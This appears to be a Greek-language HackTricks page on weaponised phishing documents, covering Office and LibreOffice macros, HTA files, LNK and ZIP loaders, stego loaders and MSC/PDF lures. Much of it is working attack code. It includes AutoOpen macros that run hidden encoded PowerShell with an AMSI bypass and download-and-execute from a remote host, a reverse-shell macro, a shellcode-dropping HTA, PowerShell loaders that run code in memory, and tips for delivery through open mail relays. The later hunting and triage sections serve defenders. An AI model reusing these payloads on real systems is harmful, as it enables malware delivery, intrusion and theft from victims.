# Αρχεία και έγγραφα Phishing

{{#include ../../banners/hacktricks-training.md}}

## Έγγραφα Office

Το Microsoft Word πραγματοποιεί επικύρωση των δεδομένων του αρχείου πριν το ανοίξει. Η επικύρωση γίνεται με τη μορφή αναγνώρισης δομής δεδομένων, σύμφωνα με το πρότυπο OfficeOpenXML. Αν προκύψει οποιοδήποτε σφάλμα κατά την αναγνώριση της δομής δεδομένων, το αρχείο που αναλύεται δεν θα ανοίξει.

Συνήθως, τα αρχεία Word που περιέχουν macros χρησιμοποιούν την επέκταση `.docm`. Ωστόσο, είναι δυνατό να μετονομάσετε το αρχείο αλλάζοντας την επέκταση και να διατηρήσετε τη δυνατότητα εκτέλεσης των macros.\
Για παράδειγμα, ένα αρχείο RTF δεν υποστηρίζει macros από σχεδιασμό, αλλά ένα αρχείο DOCM που έχει μετονομαστεί σε RTF θα υποβληθεί σε επεξεργασία από το Microsoft Word και θα μπορεί να εκτελέσει macros.\
Τα ίδια εσωτερικά στοιχεία και οι ίδιοι μηχανισμοί ισχύουν για όλο το λογισμικό της σουίτας Microsoft Office (Excel, PowerPoint κ.λπ.).

Μπορείτε να χρησιμοποιήσετε την ακόλουθη εντολή για να ελέγξετε ποιες επεκτάσεις θα εκτελεστούν από ορισμένα προγράμματα Office:

```bash
assoc | findstr /i "word excel powerp"
```

Τα αρχεία DOCX που αναφέρονται σε ένα απομακρυσμένο πρότυπο (File –Options –Add-ins –Manage: Templates –Go), το οποίο περιλαμβάνει macros, μπορούν επίσης να «εκτελέσουν» macros.

### Φόρτωση εξωτερικής εικόνας

Μεταβείτε στην επιλογή: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Έγγραφα Office - Φόρτωση εξωτερικής εικόνας: Μεταβείτε στην επιλογή: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor με macros

Είναι δυνατό να χρησιμοποιήσετε macros για να εκτελέσετε αυθαίρετο κώδικα από το έγγραφο.

#### Λειτουργίες αυτόματης φόρτωσης

Όσο πιο συνηθισμένες είναι, τόσο πιο πιθανό είναι να τις εντοπίσει το AV.

- AutoOpen()
- Document_Open()

#### Παραδείγματα κώδικα macros

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Αφαίρεση μεταδεδομένων με μη αυτόματο τρόπο

Μεταβείτε στο **File > Info > Inspect Document > Inspect Document**, για να ανοίξει το Document Inspector. Κάντε κλικ στο **Inspect** και μετά στο **Remove All** δίπλα στο **Document Properties and Personal Information**.

#### Επέκταση εγγράφου

Όταν τελειώσετε, επιλέξτε το αναπτυσσόμενο μενού **Save as type** και αλλάξτε τη μορφή από **`.docx`** σε Word 97-2003 **`.doc`**.\
Κάντε το επειδή **δεν μπορείτε να αποθηκεύσετε macro μέσα σε ένα `.docx`** και υπάρχει **αρνητική προκατάληψη** **για** την επέκταση **`.docm`**, η οποία υποστηρίζει macro (π.χ. το εικονίδιο μικρογραφίας έχει ένα τεράστιο `!` και ορισμένες πύλες web/email τα αποκλείουν εντελώς). Επομένως, η **παλαιού τύπου επέκταση `.doc` είναι ο καλύτερος συμβιβασμός**.

#### Generators για κακόβουλα Macros

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macros αυτόματης εκτέλεσης LibreOffice ODT (Basic)

Τα έγγραφα LibreOffice Writer μπορούν να ενσωματώνουν macros Basic και να τα εκτελούν αυτόματα όταν ανοίγεται το αρχείο, συνδέοντας το macro με το συμβάν **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Ένα απλό macro reverse shell μοιάζει ως εξής:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Σημειώστε τα διπλά εισαγωγικά (`""`) μέσα στη συμβολοσειρά – το LibreOffice Basic χρησιμοποιεί διπλά εισαγωγικά για να διαφύγει κυριολεκτικά εισαγωγικά, επομένως τα payloads που τελειώνουν με `...==""")` διατηρούν ισορροπημένα τόσο την εσωτερική εντολή όσο και το όρισμα του Shell.

Συμβουλές παράδοσης:

- Αποθηκεύστε το αρχείο ως `.odt` και συνδέστε το macro με το συμβάν του εγγράφου, ώστε να εκτελείται αμέσως μόλις αυτό ανοίξει.
- Όταν στέλνετε email με το `swaks`, χρησιμοποιήστε `--attach @resume.odt` (το `@` είναι απαραίτητο, ώστε να σταλούν ως συνημμένο τα bytes του αρχείου και όχι η συμβολοσειρά του ονόματός του). Αυτό είναι κρίσιμο όταν γίνεται κατάχρηση SMTP servers που δέχονται αυθαίρετους παραλήπτες `RCPT TO` χωρίς επικύρωση.

## Αρχεία HTA

Ένα HTA είναι ένα πρόγραμμα Windows που **συνδυάζει HTML και γλώσσες scripting (όπως VBScript και JScript)**. Δημιουργεί το περιβάλλον χρήστη και εκτελείται ως εφαρμογή «πλήρους εμπιστοσύνης», χωρίς τους περιορισμούς του μοντέλου ασφαλείας ενός browser.

Ένα HTA εκτελείται μέσω του **`mshta.exe`**, το οποίο συνήθως **εγκαθίσταται** μαζί με τον **Internet Explorer**, καθιστώντας το **`mshta` εξαρτημένο από τον IE**. Επομένως, αν έχει απεγκατασταθεί, τα HTA δεν θα μπορούν να εκτελεστούν.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Ψεύτικες κάρτες συνημμένων σε HTML email

Ένα HTML email μπορεί να μιμηθεί την εγγενή κάρτα προεπισκόπησης συνημμένου ενός παρόχου, χωρίς να περιέχει πραγματικό συνημμένο. Η Talos παρατήρησε μια κάρτα Gmail ανακατασκευασμένη από τέσσερα inline PNG MIME parts κωδικοποιημένα σε Base64. Ολόκληρο το οπτικό στοιχείο περικλειόταν σε ένα anchor, ενώ μια τιμή παραλήπτη στο `?m=<target-id>` επέτρεπε την παρακολούθηση ανά παραλήπτη. Ο σύνδεσμος άρχιζε με `//` αντί για `http://` ή `https://`· οι browsers επιλύουν αυτήν τη σχετική με το πρωτόκολλο μορφή, αλλά τα URL extractors που εντοπίζουν μόνο πλήρως προσδιορισμένα URLs μπορεί να μην τον εντοπίσουν.<sup>[[11]](#references)</sup>

Κατά την ανάλυση, ελέγξτε το raw MIME αντί να εμπιστεύεστε τη λίστα συνημμένων που εμφανίζεται. Ανασυνθέστε τον τρόπο με τον οποίο τα inline image parts σχηματίζουν την οπτική κάρτα, εντοπίστε το anchor που την περικλείει και κανονικοποιήστε τις τιμές `href` που είναι σχετικές με το πρωτόκολλο πριν από την εξαγωγή URLs.<sup>[[11]](#references)</sup>

Για δοκιμές πλαστογράφησης αποστολέα envelope/header και ευθυγράμμισης DMARC, δείτε το [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Εξαναγκασμός NTLM Authentication

Υπάρχουν αρκετοί τρόποι για να **εξαναγκάσετε NTLM authentication «απομακρυσμένα»**. Για παράδειγμα, μπορείτε να προσθέσετε **αόρατες εικόνες** σε emails ή HTML στα οποία θα αποκτήσει πρόσβαση ο χρήστης (ακόμη και μέσω HTTP MitM;). Ή να στείλετε στο θύμα τη **διεύθυνση αρχείων** που θα **προκαλέσουν** **authentication** απλώς και μόνο με το **άνοιγμα του φακέλου**.

**Ελέγξτε αυτές τις ιδέες και άλλες στις ακόλουθες σελίδες:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Μην ξεχνάτε ότι μπορείτε όχι μόνο να κλέψετε το hash ή τα στοιχεία authentication, αλλά και να **εκτελέσετε NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-ενσωματωμένα Payloads (fileless chain)

Ιδιαίτερα αποτελεσματικές καμπάνιες παραδίδουν ένα ZIP που περιέχει δύο νόμιμα έγγραφα-δολώματα (PDF/DOCX) και ένα κακόβουλο .lnk. Το τέχνασμα είναι ότι ο πραγματικός PowerShell loader είναι αποθηκευμένος στα raw bytes του ZIP, μετά από έναν μοναδικό marker, και το .lnk τον απομονώνει και τον εκτελεί εξ ολοκλήρου στη μνήμη.<sup>[[2]](#references)</sup>

Τυπική ροή που υλοποιείται από το PowerShell one-liner του .lnk:

1) Εντοπισμός του αρχικού ZIP σε συνήθεις διαδρομές: Desktop, Downloads, Documents, %TEMP%, %ProgramData% και στον γονικό φάκελο του τρέχοντος working directory.
2) Ανάγνωση των bytes του ZIP και εύρεση ενός hardcoded marker (π.χ. xFIQCV). Ό,τι ακολουθεί μετά τον marker αποτελεί το ενσωματωμένο PowerShell payload.
3) Αντιγραφή του ZIP στο %ProgramData%, εξαγωγή των περιεχομένων εκεί και άνοιγμα του εγγράφου-δολώματος .docx ώστε να φαίνεται νόμιμο.
4) Παράκαμψη του AMSI για την τρέχουσα διεργασία: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Αποσυσκότιση του επόμενου σταδίου (π.χ. αφαίρεση όλων των χαρακτήρων #) και εκτέλεσή του στη μνήμη.

Παράδειγμα σκελετού PowerShell για την απομόνωση και εκτέλεση του ενσωματωμένου σταδίου:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Σημειώσεις
- Η παράδοση συχνά γίνεται μέσω κατάχρησης αξιόπιστων subdomains PaaS (π.χ., *.herokuapp.com) και ενδέχεται να περιορίζεται η πρόσβαση στα payloads (π.χ., να παρέχονται αβλαβή ZIP ανάλογα με την IP/UA).
- Το επόμενο στάδιο αποκρυπτογραφεί συχνά shellcode κωδικοποιημένο σε base64/XOR και το εκτελεί μέσω Reflection.Emit + VirtualAlloc, ώστε να ελαχιστοποιούνται τα τεχνουργήματα στον δίσκο.

Persistence που χρησιμοποιείται στην ίδια αλυσίδα
- COM TypeLib hijacking του στοιχείου ελέγχου Microsoft Web Browser, ώστε το IE/Explorer ή οποιαδήποτε εφαρμογή το ενσωματώνει να επανεκκινεί αυτόματα το payload.<sup>[[2]](#references)[[4]](#references)</sup> Δείτε λεπτομέρειες και έτοιμες προς χρήση εντολές εδώ:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Αρχεία ZIP που περιέχουν τη συμβολοσειρά ASCII-δείκτη (π.χ., xFIQCV) προσαρτημένη στα δεδομένα του αρχείου.
- Αρχείο .lnk που απαριθμεί γονικούς φακέλους/φακέλους χρήστη για να εντοπίσει το ZIP και ανοίγει ένα παραπλανητικό έγγραφο.
- Παραποίηση AMSI μέσω [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Μακροσκελή επαγγελματικά νήματα email που καταλήγουν σε συνδέσμους φιλοξενούμενους σε έμπιστα domains PaaS.

## Στάδιο με πρώτα το παραπλανητικό LNK → persistence μέσω scheduled task → trusted CPL side-loading

Ένα άλλο επαναλαμβανόμενο μοτίβο είναι ένα **`.lnk` που παριστάνει έγγραφο** και ανοίγει αμέσως ένα αβλαβές δόλωμα, ενώ προετοιμάζει την πραγματική αλυσίδα στο παρασκήνιο.<sup>[[3]](#references)</sup>

Παρατηρημένη ροή εργασίας:
1. Η συντόμευση **παριστάνει αρχείο PDF** και χρησιμοποιεί το `conhost.exe` ή παρόμοιο proxy για να εκκινήσει ένα obfuscated PowerShell downloader.
2. Το PowerShell χωρίζει προφανή tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), ώστε οι απλοϊκές ανιχνεύσεις που αναζητούν τα `iwr`, `gci`, `ren`, `cpi` ή `schtasks` να μην εντοπίζουν την εντολή.
3. Το stager κατεβάζει **πρώτα το παραπλανητικό έγγραφο**, το ανοίγει για το θύμα και έπειτα ανασυνθέτει τα κακόβουλα αρχεία στο παρασκήνιο.
4. Τα payloads μπορεί να αποθηκεύονται με **παραπλανητικές επεκτάσεις** και κατόπιν να μετονομάζονται αφαιρώντας χαρακτήρες-πληρωτικά, καθυστερώντας την εμφάνιση προφανών τεχνουργημάτων `.exe` / `.cpl`.
5. Το persistence εγκαθίσταται με ένα **scheduled task που εκτελείται ανά λεπτό** και εκκινεί ένα έμπιστο host binary από διαδρομή όπου ο χρήστης έχει δικαίωμα εγγραφής.

Ελάχιστες ενδείξεις για hunting βάσει αυτού του μοτίβου:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Μια χρήσιμη διάταξη staging που αξίζει να αναγνωρίζετε είναι:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ή `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Γιατί το δεύτερο στάδιο είναι stealthy

Στη μελέτη περίπτωσης της Rapid7, η scheduled task εκτελούσε επανειλημμένα το **`Fondue.exe`** από το `C:\Users\Public\`. Επειδή το **`APPWIZ.cpl`** είχε τοποθετηθεί στον ίδιο φάκελο και εξήγαγε το **`RunFODW`**, το έμπιστο binary της Microsoft φόρτωνε μέσω side-loading το CPL του attacker αντί για το νόμιμο αντίγραφό του στο σύστημα.

Στη συνέχεια, το CPL:
- Διαβάζει ένα blob **AES-256-CBC** από το `C:\Windows\Tasks\editor.dat`
- Το αποκρυπτογραφεί μέσω **Windows CNG / `bcrypt.dll`**
- Δεσμεύει εκτελέσιμη μνήμη και αντιγράφει εκεί το decrypted shellcode
- Το εκτελεί έμμεσα, περνώντας τον δείκτη του shellcode ως callback στην **`EnumUILanguagesW`**

Αυτό το τελευταίο βήμα αξίζει να το αναζητάτε ξεχωριστά: το malware συχνά αποφεύγει ένα άμεσο άλμα `((void(*)())buf)()` και αντ' αυτού καταχράται ένα **νόμιμο WinAPI που δέχεται callback** για να μεταφέρει την εκτέλεση.

Το decrypted payload σε αυτή την καμπάνια ήταν shellcode **Donut**, το οποίο στη συνέχεια χαρτογράφησε πλήρως το τελικό PE στη μνήμη και έκανε patch τα **AMSI/WLDP/ETW** στην τρέχουσα διεργασία πριν παραδώσει την εκτέλεση. Για περισσότερες λεπτομέρειες σχετικά με το side-loading και το post-processing που εκτελείται στη μνήμη, δείτε:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Πρακτικά σημεία για το κυνήγι:
- `.lnk` που εκκινεί `powershell.exe` ή `conhost.exe` και στη συνέχεια εμφανίζει ένα παραπλανητικό έγγραφο.
- Λήψεις σύντομης διάρκειας στο **`C:\Users\Public\`** και άμεσες μετονομασίες από ακατανόητες επεκτάσεις.
- Scheduled tasks με συνηθισμένα ονόματα, όπως `GoogleErrorReport`, που εκτελούνται από **καταλόγους εγγράψιμους από τον χρήστη**.
- Έμπιστα binaries που φορτώνουν αρχεία **`.cpl` / `.dll`** από τον ίδιο κατάλογο εκτός συστήματος.
- Base64 text blobs που γράφονται στο **`C:\Windows\Tasks\`** και στη συνέχεια διαβάζονται από το side-loaded module.

## Payloads οριοθετημένα με steganography σε εικόνες (PowerShell stager)

Πρόσφατες αλυσίδες loader παραδίδουν ένα obfuscated JavaScript/VBS που αποκωδικοποιεί και εκτελεί ένα Base64 PowerShell stager. Το stager κατεβάζει μια εικόνα (συχνά GIF) που περιέχει ένα Base64-encoded .NET DLL κρυμμένο ως απλό κείμενο ανάμεσα σε μοναδικούς markers έναρξης/λήξης. Το script αναζητά αυτούς τους delimiters (παραδείγματα που έχουν παρατηρηθεί στην πράξη: «<<sudo_png>> … <<sudo_odt>>>»), εξάγει το κείμενο ανάμεσά τους, το αποκωδικοποιεί από Base64 σε bytes, φορτώνει το assembly στη μνήμη και καλεί μια γνωστή μέθοδο εισόδου με το C2 URL.<sup>[[5]](#references)</sup>

Ροή εργασίας
- Στάδιο 1: Archived JS/VBS dropper → αποκωδικοποιεί το ενσωματωμένο Base64 → εκκινεί PowerShell stager με -nop -w hidden -ep bypass.
- Στάδιο 2: PowerShell stager → κατεβάζει εικόνα, εξάγει το Base64 που οριοθετείται από markers, φορτώνει το .NET DLL στη μνήμη και καλεί τη μέθοδό του (π.χ., VAI), περνώντας το C2 URL και τις επιλογές.
- Στάδιο 3: Ο loader ανακτά το τελικό payload και συνήθως το εισάγει μέσω process hollowing σε ένα έμπιστο binary (συχνά το MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Δείτε περισσότερα για το process hollowing και την εκτέλεση μέσω proxy έμπιστων βοηθητικών προγραμμάτων εδώ:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Παράδειγμα PowerShell για εξαγωγή ενός DLL από εικόνα και κλήση μιας .NET μεθόδου στη μνήμη:

<details>
<summary>PowerShell stego payload extractor and loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Σημειώσεις
- Πρόκειται για το ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Οι δείκτες διαφέρουν ανά καμπάνια.
- Τα AMSI/ETW bypass και η αποσυσκότιση συμβολοσειρών εφαρμόζονται συνήθως πριν από τη φόρτωση του assembly.
- Hunting: σαρώστε τις εικόνες που έχουν ληφθεί για γνωστούς οριοθέτες· εντοπίστε το PowerShell να προσπελαύνει εικόνες και να αποκωδικοποιεί αμέσως blobs Base64.

Δείτε επίσης τα εργαλεία stego και τις τεχνικές carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → staging μέσω Base64 PowerShell

Ένα επαναλαμβανόμενο αρχικό στάδιο είναι ένα μικρό, έντονα συγκαλυμμένο αρχείο `.js` ή `.vbs`, το οποίο διανέμεται μέσα σε αρχείο αρχειοθέτησης. Μοναδικός σκοπός του είναι να αποκωδικοποιήσει μια ενσωματωμένη συμβολοσειρά Base64 και να εκκινήσει το PowerShell με `-nop -w hidden -ep bypass`, ώστε να προετοιμάσει το επόμενο στάδιο μέσω HTTPS.<sup>[[5]](#references)</sup>

Λογική σκελετού (αφηρημένη):
- Ανάγνωση των περιεχομένων του ίδιου του αρχείου
- Εντοπισμός ενός blob Base64 ανάμεσα σε άχρηστες συμβολοσειρές
- Αποκωδικοποίηση σε PowerShell ASCII
- Εκτέλεση με `wscript.exe`/`cscript.exe` που καλεί το `powershell.exe`

Ενδείξεις για hunting
- Συνημμένα JS/VBS μέσα σε αρχεία αρχειοθέτησης που εκκινούν το `powershell.exe` με `-enc`/`FromBase64String` στη γραμμή εντολών.
- Το `wscript.exe` εκκινεί το `powershell.exe -nop -w hidden` από προσωρινές διαδρομές χρήστη.

## Έγγραφα MSC ως περιέκτες εκτέλεσης (GrimResource)

Τα αρχεία Microsoft Management Console (`.msc`) είναι ορισμοί κονσόλας XML που συνήθως ανοίγονται από το `mmc.exe`. Το **GrimResource** οπλοποιεί μια αναφορά `StringTable` σε έναν πόρο `apds.dll` που περιέχει ένα παλιό XSS primitive, με αποτέλεσμα η JavaScript να εκτελείται μέσα στο `mmc.exe` όταν ο χρήστης ανοίξει την ειδικά διαμορφωμένη κονσόλα. Τα δείγματα που παρατηρήθηκαν συνδύαζαν συσκότιση βασισμένη στο `transformNode` με το **DotNetToJScript**, για να δημιουργήσουν ένα payload .NET χωρίς τη συνήθη οδό μακροεντολών του Office.<sup>[[9]](#references)</sup>

Για στατική αρχική διαλογή, αντιμετωπίστε ένα μη έμπιστο MSC ως κείμενο και **μην** κάνετε διπλό κλικ σε αυτό:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Οι ενδείξεις υψηλής αξιοπιστίας κατά το runtime είναι το `mmc.exe` να φορτώνει το CLR ή στοιχεία σεναρίων, να δημιουργεί συνδέσεις δικτύου ή να εκκινεί τα `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` ή κάποιο μη αναμενόμενο εκτελέσιμο. Η μορφή είναι νόμιμη, επομένως οι ανιχνεύσεις θα πρέπει να συσχετίζουν **την προέλευση + ύποπτο περιεχόμενο XML/σεναρίου + τη συμπεριφορά του `mmc.exe`**, αντί να αποκλείουν κάθε MSC.<sup>[[9]](#references)</sup>

## Ανακατευθυντές PDF/QR και ελεγχόμενη παράδοση payload

Ένα PDF δεν χρειάζεται exploit για να είναι χρήσιμο. Πρόσφατες καμπάνιες τοποθετούν έναν **κωδικό QR ή έναν συνηθισμένο σύνδεσμο** σε ένα έγγραφο που φαίνεται ακίνδυνο, μεταφέρουν τη συνεδρία του browser εκτός των ελέγχων του email και εξατομικεύουν τον προορισμό με τη διεύθυνση του παραλήπτη. Η Microsoft κατέγραψε το 2025 PDF με URL QR μοναδικά για κάθε παραλήπτη, τα οποία οδηγούσαν σε υποδομή υποκλοπής διαπιστευτηρίων RaccoonO365· μια παράλληλη αλυσίδα χρησιμοποιούσε έλεγχο βάσει IP/περιβάλλοντος, ώστε να επιστρέφει διαδρομή JavaScript/MSI σε επιλεγμένους επισκέπτες, αλλά ένα ακίνδυνο PDF σε scanners ή μη επιτρεπόμενους clients.<sup>[[10]](#references)</sup>

Κατά τη διαλογή, ελέγξτε τόσο τις ενέργειες PDF όσο και τους κωδικούς QR όπως αποδίδονται. Ένας κωδικός QR μπορεί να είναι σχεδιασμένος ως vector αντί να είναι αποθηκευμένος ως εξαγώγιμη εικόνα, επομένως μετατρέψτε κάθε σελίδα σε raster, εκτός από την εξαγωγή των ενσωματωμένων εικόνων:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Επιθεωρήστε τους αποκωδικοποιημένους προορισμούς και τις ανακατευθύνσεις από ένα απομονωμένο σύστημα ανάλυσης, χωρίς να πραγματοποιήσετε αυθεντικοποίηση. Χρήσιμα χαρακτηριστικά για hunting είναι τα PDF που περιέχουν μόνο QR code και έχουν σχεδόν κενό σώμα email, η διεύθυνση email του παραλήπτη ενσωματωμένη σε παράμετρο query, οι πολλαπλές ανακατευθύνσεις μέσω αξιόπιστων υπηρεσιών φιλοξενίας και το διαφορετικό περιεχόμενο που επιστρέφεται ανάλογα με την IP, τη γεωγραφική τοποθεσία, τα cookies, το referrer ή το user agent. Συγκρίνετε τα requests με ελεγχόμενα profiles, καθώς ένα μόνο sandbox fetch μπορεί να λάβει μόνο το decoy.<sup>[[10]](#references)</sup>

## Αρχεία Windows για υποκλοπή NTLM hashes

Δείτε τη σελίδα σχετικά με τα **σημεία από τα οποία μπορείτε να υποκλέψετε NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – macro LibreOffice → webshell IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Καμπάνια ZipLine: Μια εξελιγμένη επίθεση phishing με στόχο εταιρείες των ΗΠΑ](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Παρακολούθηση του tradecraft του Dropping Elephant μέσω μιας αλυσίδας loader με θέμα την Κίνα](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Νέα τεχνική persistence COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Ο loader PhantomVAI διανέμει μια σειρά από infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Στεγανογραφία (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Proxy execution μέσω έμπιστων εργαλείων προγραμματιστών: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
